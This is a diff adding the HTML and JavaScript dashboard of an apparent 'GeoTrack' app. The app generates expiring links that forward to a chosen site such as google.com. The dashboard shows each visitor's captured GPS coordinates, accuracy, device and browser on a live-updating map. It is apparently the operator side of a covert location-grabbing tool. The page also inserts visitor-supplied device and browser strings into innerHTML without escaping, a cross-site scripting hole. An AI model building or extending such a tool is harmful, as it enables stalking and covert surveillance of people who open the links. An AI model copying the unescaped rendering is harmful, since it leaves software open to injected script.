@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GeoTrack — Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{--bg:#080b10;--s:#0d1117;--border:#1a2030;--accent:#00ff88;--red:#ff3a5c;--text:#e2e8f0;--muted:#4a5568;--card:#0d1117;--accent2:#0095ff}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;display:flex;flex-direction:column}
+
+/* TOPNAV */
+.topnav{background:var(--s);border-bottom:1px solid var(--border);padding:0 1.5rem;height:54px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+.nav-logo{font-size:1.1rem;font-weight:800;letter-spacing:-0.03em}
+.nav-logo span{color:var(--accent)}
+.nav-right{display:flex;align-items:center;gap:1rem}
+.nav-user{font-family:'Space Mono',monospace;font-size:0.72rem;color:var(--muted)}
+.nav-user strong{color:var(--text)}
+.btn-logout{background:transparent;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace;font-size:0.7rem;padding:5px 12px;border-radius:3px;cursor:pointer;transition:border-color .2s,color .2s}
+.btn-logout:hover{border-color:var(--red);color:var(--red)}
+
+/* LAYOUT */
+.layout{display:flex;flex:1;overflow:hidden}
+
+/* SIDEBAR */
+.sidebar{width:320px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.sidebar-header{padding:1.25rem 1.25rem .75rem;border-bottom:1px solid var(--border);flex-shrink:0}
+.sidebar-title{font-family:'Space Mono',monospace;font-size:0.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.12em;margin-bottom:.75rem}
+
+/* Generator */
+.gen-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:1rem}
+.field{display:flex;flex-direction:column;gap:5px;margin-bottom:.75rem}
+.field:last-of-type{margin-bottom:0}
+label{font-family:'Space Mono',monospace;font-size:0.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em}
+input,select{background:#060a0f;border:1px solid var(--border);color:var(--text);font-family:'Space Mono',monospace;font-size:0.82rem;padding:.6rem .8rem;border-radius:4px;outline:none;transition:border-color .2s;width:100%}
+input:focus,select:focus{border-color:var(--accent)}
+input::placeholder{color:var(--muted)}
+select option{background:#060a0f}
+
+.btn-gen{width:100%;background:var(--accent);color:#000;border:none;font-family:'Space Mono',monospace;font-size:0.75rem;font-weight:700;padding:.65rem;border-radius:4px;cursor:pointer;text-transform:uppercase;letter-spacing:0.07em;transition:background .15s;margin-top:.75rem}
+.btn-gen:hover{background:#00e87a}
+.btn-gen:disabled{opacity:.5;cursor:not-allowed}
+
+.gen-result{display:none;margin-top:.75rem;padding:.75rem;background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.2);border-radius:4px}
+.gen-result.show{display:block}
+.gen-link{font-family:'Space Mono',monospace;font-size:0.72rem;color:var(--accent);word-break:break-all;line-height:1.5;margin-bottom:.5rem}
+.btn-copy{background:transparent;border:1px solid rgba(0,255,136,0.3);color:var(--accent);font-family:'Space Mono',monospace;font-size:0.68rem;padding:4px 10px;border-radius:3px;cursor:pointer;transition:background .15s}
+.btn-copy:hover{background:rgba(0,255,136,0.1)}
+
+/* Links list */
+.links-list{flex:1;overflow-y:auto;padding:.75rem}
+.links-list::-webkit-scrollbar{width:4px}
+.links-list::-webkit-scrollbar-track{background:transparent}
+.links-list::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+
+.link-card{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.85rem 1rem;margin-bottom:.6rem;cursor:pointer;transition:border-color .2s}
+.link-card:hover{border-color:rgba(0,255,136,0.3)}
+.link-card.active{border-color:var(--accent)}
+.lc-dest{font-size:.88rem;font-weight:700;margin-bottom:.35rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.lc-meta{display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
+.lc-badge{font-family:'Space Mono',monospace;font-size:0.62rem;padding:2px 7px;border-radius:2px;border:1px solid}
+.lc-badge.hits{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.2);color:var(--accent)}
+.lc-badge.exp{background:rgba(255,58,92,0.08);border-color:rgba(255,58,92,0.2);color:var(--red)}
+.lc-badge.live{background:rgba(0,149,255,0.08);border-color:rgba(0,149,255,0.2);color:var(--accent2)}
+.lc-time{font-family:'Space Mono',monospace;font-size:0.6rem;color:var(--muted)}
+.lc-del{margin-left:auto;background:transparent;border:none;color:var(--muted);font-size:.8rem;cursor:pointer;padding:2px 5px;transition:color .2s}
+.lc-del:hover{color:var(--red)}
+
+.empty{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);text-align:center;padding:2rem;border:1px dashed var(--border);border-radius:6px}
+
+/* MAIN */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+
+.main-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:space-between}
+.main-title{font-size:1.1rem;font-weight:700}
+.main-sub{font-family:'Space Mono',monospace;font-size:.68rem;color:var(--muted);margin-top:2px}
+.live-badge{display:flex;align-items:center;gap:5px;font-family:'Space Mono',monospace;font-size:.65rem;color:var(--accent)}
+.live-dot{width:6px;height:6px;background:var(--accent);border-radius:50%;animation:blink 1.2s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+.main-body{flex:1;overflow-y:auto;padding:1.25rem 1.5rem}
+.main-body::-webkit-scrollbar{width:4px}
+.main-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+
+/* no link selected */
+.no-select{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:1rem;color:var(--muted)}
+.no-select .icon{font-size:3rem;opacity:.3}
+.no-select p{font-family:'Space Mono',monospace;font-size:.75rem;text-align:center;line-height:1.6}
+
+/* hits */
+.hits-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;margin-bottom:1.5rem}
+.hit-card{background:var(--s);border:1px solid var(--border);border-radius:8px;padding:1rem 1.1rem}
+.hit-num{font-family:'Space Mono',monospace;font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem}
+.hit-row{display:flex;justify-content:space-between;align-items:center;padding:.35rem 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+.hit-row:last-child{border-bottom:none}
+.hk{font-family:'Space Mono',monospace;font-size:.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:.07em}
+.hv{font-family:'Space Mono',monospace;font-size:.78rem;color:var(--text)}
+.hv.green{color:var(--accent)}
+.hv.blue{color:var(--accent2)}
+.map-link{display:inline-block;margin-top:.6rem;font-family:'Space Mono',monospace;font-size:.65rem;color:var(--accent);text-decoration:none;border:1px solid rgba(0,255,136,0.2);padding:3px 9px;border-radius:3px;transition:background .15s}
+.map-link:hover{background:rgba(0,255,136,0.08)}
+
+/* map */
+.map-wrap{height:300px;border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:1.5rem}
+#map{height:100%;width:100%;background:#0a0e15}
+.leaflet-tile{filter:brightness(0.7) saturate(0.8)}
+
+.no-hits-msg{text-align:center;padding:3rem;font-family:'Space Mono',monospace;font-size:.78rem;color:var(--muted);border:1px dashed var(--border);border-radius:8px}
+
+.section-label{font-family:'Space Mono',monospace;font-size:.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:.12em;margin-bottom:.75rem}
+
+/* expiry info bar */
+.expiry-bar{display:flex;align-items:center;gap:.75rem;padding:.6rem 1rem;border-radius:5px;margin-bottom:1.25rem;font-family:'Space Mono',monospace;font-size:.72rem}
+.expiry-bar.live{background:rgba(0,149,255,0.07);border:1px solid rgba(0,149,255,0.2);color:var(--accent2)}
+.expiry-bar.dead{background:rgba(255,58,92,0.07);border:1px solid rgba(255,58,92,0.2);color:var(--red)}
+</style>
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">Geo<span>Track</span></div>
+  <div class="nav-right">
+    <span class="nav-user">Hello, <strong id="navName">…</strong></span>
+    <button class="btn-logout" onclick="logout()">Logout</button>
+  </div>
+</nav>
+
+<div class="layout">
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-title">Generate New Link</div>
+      <div class="gen-box">
+        <div class="field"><label>Destination URL</label><input type="text" id="destUrl" placeholder="https://google.com"></div>
+        <div class="field">
+          <label>Expires In</label>
+          <select id="expiresIn">
+            <option value="1">1 Hour</option>
+            <option value="2">2 Hours</option>
+            <option value="3">3 Hours</option>
+            <option value="6">6 Hours</option>
+            <option value="12">12 Hours</option>
+            <option value="24">24 Hours</option>
+          </select>
+        </div>
+        <button class="btn-gen" id="genBtn" onclick="generateLink()">⚡ Generate Link</button>
+        <div class="gen-result" id="genResult">
+          <div class="gen-link" id="genLink"></div>
+          <button class="btn-copy" onclick="copyGenLink()">Copy Link</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="links-list" id="linksList">
+      <div class="empty">No links yet.<br>Generate one above.</div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="main-header">
+      <div>
+        <div class="main-title" id="mainTitle">Select a link</div>
+        <div class="main-sub" id="mainSub">Click any link from the sidebar to view hits</div>
+      </div>
+      <div class="live-badge" id="liveBadge" style="display:none"><div class="live-dot"></div>Live</div>
+    </div>
+
+    <div class="main-body" id="mainBody">
+      <div class="no-select">
+        <div class="icon">📍</div>
+        <p>Select a generated link<br>to view incoming locations</p>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+let activeLinkId = null;
+let pollTimer = null;
+let mapInstance = null;
+let mapMarkers = [];
+
+// ── Init ──────────────────────────────────────────────────────────────
+(async () => {
+  const me = await fetch('/api/me').then(r=>r.json());
+  if (!me.loggedIn) return window.location.href = '/';
+  document.getElementById('navName').textContent = me.name;
+  loadLinks();
+  setInterval(loadLinks, 8000);
+})();
+
+async function logout() {
+  await fetch('/api/logout', { method: 'POST' });
+  window.location.href = '/';
+}
+
+// ── Links list ────────────────────────────────────────────────────────
+async function loadLinks() {
+  const links = await fetch('/api/links').then(r=>r.json()).catch(()=>[]);
+  const el = document.getElementById('linksList');
+  if (!links.length) { el.innerHTML = '<div class="empty">No links yet.<br>Generate one above.</div>'; return; }
+
+  el.innerHTML = links.map(l => {
+    const expired = new Date(l.expiresAt) < new Date();
+    const timeLeft = expired ? 'Expired' : formatExpiry(l.expiresAt);
+    return `
+    <div class="link-card ${l.id===activeLinkId?'active':''}" onclick="selectLink('${l.id}')">
+      <div style="display:flex;align-items:flex-start">
+        <div style="flex:1;overflow:hidden">
+          <div class="lc-dest">${getDomain(l.dest)}</div>
+          <div class="lc-meta">
+            <span class="lc-badge ${expired?'exp':'live'}">${timeLeft}</span>
+            <span class="lc-badge hits">${l.hitCount} hit${l.hitCount!==1?'s':''}</span>
+          </div>
+          <div class="lc-time" style="margin-top:.35rem">${fmtDate(l.createdAt)}</div>
+        </div>
+        <button class="lc-del" onclick="deleteLink(event,'${l.id}')">✕</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ── Generate ──────────────────────────────────────────────────────────
+async function generateLink() {
+  const dest = document.getElementById('destUrl').value.trim();
+  if (!dest) return alert('Enter a destination URL');
+  const expiresIn = document.getElementById('expiresIn').value;
+  const btn = document.getElementById('genBtn');
+  btn.disabled = true; btn.textContent = 'Generating…';
+
+  try {
+    const data = await fetch('/api/links/create', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ dest, expiresIn })
+    }).then(r=>r.json());
+
+    if (data.error) throw new Error(data.error);
+    document.getElementById('genLink').textContent = data.trackUrl;
+    document.getElementById('genResult').classList.add('show');
+    loadLinks();
+    selectLink(data.id);
+  } catch(e) { alert(e.message); }
+  btn.disabled = false; btn.textContent = '⚡ Generate Link';
+}
+
+function copyGenLink() {
+  navigator.clipboard.writeText(document.getElementById('genLink').textContent)
+    .then(() => { const b=document.querySelector('.btn-copy'); b.textContent='Copied!'; setTimeout(()=>b.textContent='Copy Link',2000); });
+}
+
+// ── Select & view link ────────────────────────────────────────────────
+function selectLink(id) {
+  activeLinkId = id;
+  if (pollTimer) clearInterval(pollTimer);
+  fetchAndRender(id);
+  pollTimer = setInterval(() => fetchAndRender(id), 4000);
+  loadLinks();
+}
+
+async function fetchAndRender(id) {
+  const data = await fetch(`/api/links/${id}/hits`).then(r=>r.json()).catch(()=>null);
+  if (!data) return;
+
+  const expired = new Date(data.expiresAt) < new Date();
+  const domain = getDomain(data.dest);
+
+  document.getElementById('mainTitle').textContent = domain;
+  document.getElementById('mainSub').textContent = `→ ${data.dest}`;
+  document.getElementById('liveBadge').style.display = expired ? 'none' : 'flex';
+
+  let html = '';
+
+  // Expiry bar
+  html += `<div class="expiry-bar ${expired?'dead':'live'}">
+    ${expired
+      ? `🔴 Link expired on ${fmtDate(data.expiresAt)}`
+      : `🟢 Active — expires ${formatExpiry(data.expiresAt)}`}
+  </div>`;
+
+  const hits = data.hits;
+
+  if (!hits.length) {
+    html += '<div class="no-hits-msg">Waiting for someone to open the link…</div>';
+  } else {
+    // Map
+    html += '<div class="section-label">Location Map</div>';
+    html += '<div class="map-wrap"><div id="map"></div></div>';
+    html += `<div class="section-label">${hits.length} Hit${hits!==1?'s':''} Received</div>`;
+    html += '<div class="hits-grid">';
+    [...hits].reverse().forEach((h, i) => {
+      html += `<div class="hit-card">
+        <div class="hit-num">Hit #${hits.length - i}</div>
+        <div class="hit-row"><span class="hk">Latitude</span><span class="hv green">${h.lat ?? '—'}</span></div>
+        <div class="hit-row"><span class="hk">Longitude</span><span class="hv green">${h.lon ?? '—'}</span></div>
+        <div class="hit-row"><span class="hk">Accuracy</span><span class="hv">${h.acc ? h.acc+'m' : '—'}</span></div>
+        <div class="hit-row"><span class="hk">Device</span><span class="hv blue">${h.device}</span></div>
+        <div class="hit-row"><span class="hk">Browser</span><span class="hv">${h.browser}</span></div>
+        <div class="hit-row"><span class="hk">Time</span><span class="hv">${fmtDate(h.time)}</span></div>
+        ${h.lat&&h.lon?`<a class="map-link" href="https://maps.google.com/?q=${h.lat},${h.lon}" target="_blank">🗺 Open in Maps</a>`:''}
+      </div>`;
+    });
+    html += '</div>';
+  }
+
+  document.getElementById('mainBody').innerHTML = html;
+
+  // Init Leaflet map
+  if (hits.length) {
+    const validHits = hits.filter(h => h.lat && h.lon);
+    if (validHits.length) {
+      setTimeout(() => {
+        if (mapInstance) { mapInstance.remove(); mapInstance = null; }
+        mapInstance = L.map('map', { zoomControl: true });
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+          attribution: '©OSM ©Carto', maxZoom: 18
+        }).addTo(mapInstance);
+
+        const bounds = [];
+        validHits.forEach((h, i) => {
+          const marker = L.circleMarker([h.lat, h.lon], {
+            radius: 8, fillColor: '#00ff88', color: '#000',
+            weight: 2, opacity: 1, fillOpacity: 0.85
+          }).addTo(mapInstance)
+            .bindPopup(`<b>Hit #${i+1}</b><br>${h.lat}, ${h.lon}<br>${h.device} / ${h.browser}<br>${fmtDate(h.time)}`);
+          bounds.push([h.lat, h.lon]);
+        });
+        if (bounds.length === 1) mapInstance.setView(bounds[0], 13);
+        else mapInstance.fitBounds(bounds, { padding: [30, 30] });
+      }, 100);
+    }
+  }
+}
+
+async function deleteLink(e, id) {
+  e.stopPropagation();
+  if (!confirm('Delete this link?')) return;
+  await fetch(`/api/links/${id}`, { method: 'DELETE' });
+  if (activeLinkId === id) {
+    activeLinkId = null;
+    if (pollTimer) clearInterval(pollTimer);
+    document.getElementById('mainBody').innerHTML = '<div class="no-select"><div class="icon">📍</div><p>Select a generated link<br>to view incoming locations</p></div>';
+    document.getElementById('mainTitle').textContent = 'Select a link';
+    document.getElementById('mainSub').textContent = 'Click any link from the sidebar to view hits';
+    document.getElementById('liveBadge').style.display = 'none';
+  }
+  loadLinks();
+}
+
+// ── Helpers ───────────────────────────────────────────────────────────
+function getDomain(url) {
+  try { return new URL(url).hostname; } catch(e) { return url; }
+}
+
+function fmtDate(iso) {
+  const d = new Date(iso);
+  return d.toLocaleDateString('en-IN', { day:'2-digit', month:'short' }) + ' ' +
+    d.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
+}
+
+function formatExpiry(iso) {
+  const diff = new Date(iso) - new Date();
+  if (diff <= 0) return 'Expired';
+  const h = Math.floor(diff / 3600000);
+  const m = Math.floor((diff % 3600000) / 60000);
+  if (h > 0) return `in ${h}h ${m}m`;
+  return `in ${m}m`;
+}
+</script>
+</body>
+</html>
